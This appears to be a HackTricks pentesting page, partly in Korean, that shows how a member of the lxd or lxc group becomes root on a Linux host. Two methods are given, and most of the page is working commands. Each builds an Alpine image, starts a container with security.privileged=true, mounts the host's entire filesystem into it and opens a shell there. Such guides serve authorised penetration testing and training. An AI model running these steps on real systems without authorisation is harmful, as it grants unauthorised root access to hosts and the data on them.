# lxd/lxc 그룹 - 권한 상승

{{#include ../../../banners/hacktricks-training.md}}

_if you belong to_ _**lxd**_ **or** _**lxc**_ **group**, you can become root_

## 인터넷 없이 악용하기

### 방법 1

You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
파일 **lxd.tar.xz**와 **rootfs.squashfs**를 업로드하고, 이미지를 레포지토리에 추가한 후 컨테이너를 생성합니다:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 이 오류 _**Error: No storage pool found. Please create a new storage pool**_를 발견하면\
> **`lxd init`**를 실행하고 **이전 명령어 조각을 반복**하세요.

마지막으로 컨테이너를 실행하고 root를 얻을 수 있습니다:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Alpine 이미지를 빌드하고 `security.privileged=true` 플래그를 사용하여 시작하여 컨테이너가 호스트 파일 시스템과 루트로 상호 작용하도록 강제합니다.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
